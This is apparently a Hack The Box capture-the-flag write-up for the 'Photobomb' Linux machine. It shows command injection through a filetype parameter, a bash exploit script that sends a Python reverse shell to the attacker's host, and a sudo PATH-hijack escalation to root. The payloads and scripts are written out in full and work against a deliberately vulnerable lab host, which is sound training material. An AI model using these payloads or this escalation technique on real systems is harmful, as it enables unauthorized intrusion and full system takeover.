+++
title = 'PhotBomb From Hack The Box - Easy Linux Machine'
date = 2022-12-15T15:44:32+01:00
draft = false
type = "post"
excerpt = "Exploiting Command injection vuln to gain access to the machine then exploiting a script that we can run as root without password to gain root access."
authors = ["Hassan AL ACHEK"]
tags = ["HTB", "CTF", "Linux", "Hacking"]
categories = []
readingTime = 5  
hero = "/images/photobomb.jpg"
+++

# Recon:

## Nmap Scan:

### Quick Nmap Scan:

- Open Ports: 80 (http) - 22 (ssh)

```bash
goku@exploitation:~$ export IP=10.10.11.182
goku@exploitation:~$ nmap $IP
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-15 05:59 CET
Nmap scan report for 10.10.11.182
Host is up (0.022s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds

```

### Nmap Full Scan:

```bash
goku@exploitation:~$ nmap -p- $IP
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-15 06:01 CET
Nmap scan report for 10.10.11.182
Host is up (0.024s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 9.12 seconds
```

### Nmap Services Version Fingerprinting:

```bash
goku@exploitation:~$ nmap -p80,22 -sV -sC $IP
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-15 06:02 CET
Nmap scan report for 10.10.11.182
Host is up (0.022s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.72 seconds
```

- Let's add `photobomb.htb` to our `/etc/hosts` file:

```bash
root@exploitation:/home/goku\# echo "10.10.11.182 photobomb.htb" >> /etc/hosts
```

## Recon: Web application - Port 80 (http)

- Main page:

![Image alt](/images/Pasted-image-20221215060938.png)

- Web Tech Stack:

![Image alt](/images/Pasted-image-20221215070211.png)

- Main page source page:

  - Intersting message:

  > To get started, please click here! (the credentials are in your welcome pack).

![Image alt](/images/Pasted-image-20221215061346.png)

- Click here will take you to an new Endpoint: `/printer`
- From the page source code we can discover a custom javascript file `photobomb.js` ! Intersting!. Let's examine it!

```javascript
// photobomb.js content

function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (
    document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)
  ) {
    document
      .getElementsByClassName("creds")[0]
      .setAttribute("href", "http://pH0t0:b0Mb!@photobomb.htb/printer");
  }
}
window.onload = init;
```

- `/printer` endpoint:

  - Login Needed

![Image alt](/images/Pasted-image-20221215062312.png)

- From the `photbomb.js`:
  - We can find valide credentials as the following message state:

```javascript
// Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me

document
  .getElementsByClassName("creds")[0]
  .setAttribute("href", "http://pH0t0:b0Mb!@photobomb.htb/printer");

// Username: pH0t0
// Password: b0Mb!
```

- After login to the `/printer`:

![Image alt](/images/Pasted-image-20221215063041.png)

- You can here choose a photo to download, the photo's quality, the photo's type (png or jpg) and then click the download button
- Let's fire up burpsuite and intercept this request\

![Image alt](/images/Pasted-image-20221215063530.png)

- The Download HTTP requets:

![Image alt](/images/Pasted-image-20221215064122.png)

- After Anlysing the web application:

  - The web application does not use a database. Photos are hard-coded inside the html code
  - The Web application performs image conversion behind the scene from jpg to png - based on the `filetype` parameter

- If we submit an unknown filetype, we will get the following error:

![Image alt](/images/Pasted-image-20221215071935.png)

- I tried arbitray files from the server but i get the following error `Invalid photo.`
- As we said before the web application performs some kind of conversion, so i decided to test for command injection vulnerability.
- I tested the 3 parameters. But, only the `filetype` was injectable with a blind command injection.

### Verifying the blind command injection vulnerability:

- Start a local http server:

```bash
# Terminal 1
goku@exploitation:~$ python -m http.server 8088
Serving HTTP on 0.0.0.0 port 8088 (http://0.0.0.0:8088/) ...
```

- Insert the following payload into the `filetype` parameter:
  Payload: `jpg;curl http://10.10.14.2:8088`

```bash
# Teminal 2
goku@exploitation:~$ curl -X POST -H "Authorization: Basic cEgwdDA6YjBNYiE=" -d "photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;curl http://10.10.14.2:8088&dimensions=600x400" http://photobomb.htb/printer

Failed to generate a copy of voicu-apostol-MWER49YaD-M-unsplash.jpg

goku@exploitation:~$

```

- An HTTP request received from the `photobomb` remote machine:

```bash
# Terminal 1
goku@exploitation:~$ python -m http.server 8088
Serving HTTP on 0.0.0.0 port 8088 (http://0.0.0.0:8088/) ...
10.10.11.182 - - [15/Dec/2022 07:30:35] "GET / HTTP/1.1" 200 -

```

## Getting foothold (User flag): Exploiting the command injection vulnerability

- A simple bash script to exploit the vuln automatically:

```bash
# exploit.sh
#!/bin/bash

# Get the Machine IP
IP=$(ip a s tun0 | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
PORT=4444

# Python reverse shell
echo "[+] Bulding the Payload"
CMD="python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"

# Start netcat listner on the background
echo "[+] Listning at $IP:$PORT"
# nohup nc -dlvp "$PORT" &

# Exploit
curl -X POST -H "Authorization: Basic cEgwdDA6YjBNYiE=" -d "photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;$CMD&dimensions=600x400" "http://photobomb.htb/printer" &>/dev/null && echo "[+] Pwned!" && echo "[+] Here is your shell" # && fg %+

```

```bash
# Terminal 1
goku@exploitation:~$ ./exploit.sh
[+] Bulding the Payload
[+] Listning at 10.10.14.2:4444
[+] Pwned!
[+] Here is your shell
```

```bash
# Terminal 2
# Connection received
goku@exploitation:~$ nc -lvp 4444
listening on [any] 4444 ...
connect to [10.10.14.2] from photobomb.htb [10.10.11.182] 53292
$ whoami
whoami
wizard
$ ls
ls
log  photobomb.sh  public  resized_images  server.rb  source_images
$ cd /home/wizard
cd /home/wizard
$ ls
ls
photobomb  user.txt
```

### Upgrade legacy shell to interactive shell:

```bash
# In reverse shell
goku@exploitation:~$ nc -lvp 4444
listening on [any] 4444 ...
connect to [10.10.14.2] from photobomb.htb [10.10.11.182] 42836
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
wizard@photobomb:~/photobomb$

Ctrl-Z

# In Kali
goku@exploitation:~$ stty raw -echo
goku@exploitation:~$ fg

# In reverse shell
wizard@photobomb:~/photobomb$ reset
wizard@photobomb:~/photobomb$ export SHELL=bash
wizard@photobomb:~/photobomb$ export TERM=xterm-256color
wizard@photobomb:~/photobomb$ stty rows 38 columns 116

wizard@photobomb:~$ id
uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)
wizard@photobomb:~$ # Amazing full tty shell
```

### The vulnerability root cause:

```ruby
# server.rb
require 'sinatra'

set :public_folder, 'public'

get '/' do

  html = <<~HTML
<!DOCTYPE html>
<html>
<head>
  <title>Photobomb</title>
  <link type="text/css" rel="stylesheet" href="styles.css" media="all" />
  <script src="photobomb.js"></script>
</head>
<body>
  <div id="container">
    <header>
      <h1><a href="/">Photobomb</a></h1>
    </header>
    <article>
      <h2>Welcome to your new Photobomb franchise!</h2>
      <p>You will soon be making an amazing income selling premium photographic gifts.</p>
      <p>This state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.</p>
      <p>To get started, please <a href="/printer" class="creds">click here!</a> (the credentials are in your welcome pack).</p>
      <p>If you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.</p>
    </article>
  </div>
</body>
</html>
HTML

  content_type :html
  return html
end

get '/printer' do

  images = ''
  checked = ' checked="checked" '
  Dir.glob('public/ui_images/*.jpg') do |jpg_filename|
    img_src = jpg_filename.sub('public/', '')
    img_name = jpg_filename.sub('public/ui_images/', '')
    images += '<input type="radio" name="photo" value="' + img_name + '" id="' + img_name + '"' + checked + '/><label for="' + img_name + '" style="background-image: url(' + img_src + ')"></label>'
    checked = ''
  end

  html = <<~HTML
<!DOCTYPE html>
<html>
<head>
  <title>Photobomb</title>
  <link type="text/css" rel="stylesheet" href="styles.css" media="all" />
</head>
<body>
  <div id="container">
    <header>
      <h1><a href="/">Photobomb</a></h1>
    </header>
    <form id="photo-form" action="/printer" method="post">
      <h3>Select an image</h3>
      <fieldset id="image-wrapper">
      #{images}
      </fieldset>
      <fieldset id="image-settings">
      <label for="filetype">File type</label>
      <select name="filetype" title="JPGs work on most printers, but some people think PNGs give better quality">
        <option value="jpg">JPG</option>
        <option value="png">PNG</option>
        </select>
      <div class="product-list">
        <input type="radio" name="dimensions" value="3000x2000" id="3000x2000" checked="checked"/><label for="3000x2000">3000x2000 - mousemat</label>
        <input type="radio" name="dimensions" value="1000x1500" id="1000x1500"/><label for="1000x1500">1000x1500 - mug</label>
        <input type="radio" name="dimensions" value="600x400" id="600x400"/><label for="600x400">600x400 - phone cover</label>
        <input type="radio" name="dimensions" value="300x200" id="300x200"/><label for="300x200">300x200 - keyring</label>
        <input type="radio" name="dimensions" value="150x100" id="150x100"/><label for="150x100">150x100 - usb stick</label>
        <input type="radio" name="dimensions" value="30x20" id="30x20"/><label for="30x20">30x20 - micro SD card</label>
      </div>
      </fieldset>
      <div class="controls">
        <button type="submit">download photo to print</button>
      </div>
    </form>
  </div>
</body>
</html>
HTML

  content_type :html
  return html
end

post '/printer' do
  photo = params[:photo]
  filetype = params[:filetype]
  dimensions = params[:dimensions]

  # handle inputs
  if photo.match(/\.{2}|\//)
    halt 500, 'Invalid photo.'
  end

  if !FileTest.exist?( "source_images/" + photo )
    halt 500, 'Source photo does not exist.'
  end

  if !filetype.match(/^(png|jpg)/)
    halt 500, 'Invalid filetype.'
  end

  if !dimensions.match(/^[0-9]+x[0-9]+$/)
    halt 500, 'Invalid dimensions.'
  end

  case filetype
  when 'png'
    content_type 'image/png'
  when 'jpg'
    content_type 'image/jpeg'
  end

  filename = photo.sub('.jpg', '') + '_' + dimensions + '.' + filetype
  response['Content-Disposition'] = "attachment; filename=#{filename}"

  if !File.exists?('resized_images/' + filename)
    command = 'convert source_images/' + photo + ' -resize ' + dimensions + ' resized_images/' + filename
    puts "Executing: #{command}"
    system(command)
  else
    puts "File already exists."
  end

  if File.exists?('resized_images/' + filename)
    halt 200, {}, IO.read('resized_images/' + filename)
  end

  #message = 'Failed to generate a copy of ' + photo + ' resized to ' + dimensions + ' with filetype ' + filetype
  message = 'Failed to generate a copy of ' + photo
  halt 500, message
end
```

- After reviewing the above code:
- Th web application execute a native linux command `convert` to resize the image
- The web application validates the `filetype`, if it starts with `jpg or png` only

```ruby
...
if !filetype.match(/^(png|jpg)/)
...
```

- And then the web application take the `filetype` and concatenate it with the rest of the command:

```ruby
...
 command = 'convert source_images/' + photo + ' -resize ' + dimensions + ' resized_images/' + filename
    puts "Executing: #{command}"
    system(command)
...
```

- On linux we can excute two command in parallel using the `;` operator:

```bash
# command1;command2
ls;pwd
```

- Using this concept, we can execute commands on the server by entering the following `filetype`: `jpg;command`

## Privilege Escalation (Road to root):

```bash
wizard@photobomb:~/photobomb$ sudo -l

Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh

wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;

wizard@photobomb:~/photobomb$
```

- We can run the `cleanup.sh` sript with sudo without password
- Let's analyse the `cleanup.sh` script:

```bash
# cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

- The script find all files that ends with .`jpg` inside the `source_images` directory and change the files owner to the root.

- This script run as a cronjob:

```bash
wizard@photobomb:~/photobomb/source_images$ crontab -l
# Edit this file to introduce tasks to be run by cron.
#
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
#
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
#
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
#
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
#
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
#
# For more information see the manual pages of crontab(5) and cron(8)
#
# m h  dom mon dow   command
*/5 * * * * sudo /opt/cleanup.sh

```

- If a non-privileged user can run a script with `sudo` without a password and the script uses a binary without specifying **the full path to the binary** (`find` in our case), the non-privileged user could potentially elevate their privileges by modifying the script to run a different binary with the same name as the original binary. For example, if the script uses the `cp` command without specifying the full path, the user could create a malicious binary called `cp` in a directory that is earlier in the `PATH` environment variable than the real `cp` binary, and then run the script with `sudo`. This would cause the script to run the malicious `cp` binary instead of the real one, potentially allowing the user to execute arbitrary code with elevated privileges.

```bash
wizard@photobomb:~$ echo bash > find
wizard@photobomb:~$ ls
find  photobomb  user.txt
wizard@photobomb:~$ chmod +x find
wizard@photobomb:~$ sudo PATH=$PWD:$PATH /opt/cleanup.sh
root@photobomb:/home/wizard/photobomb# id
uid=0(root) gid=0(root) groups=0(root)
root@photobomb:/home/wizard/photobomb# cd
root@photobomb:~# ls
root.txt
```

# Rooted, Thanks For Reading!
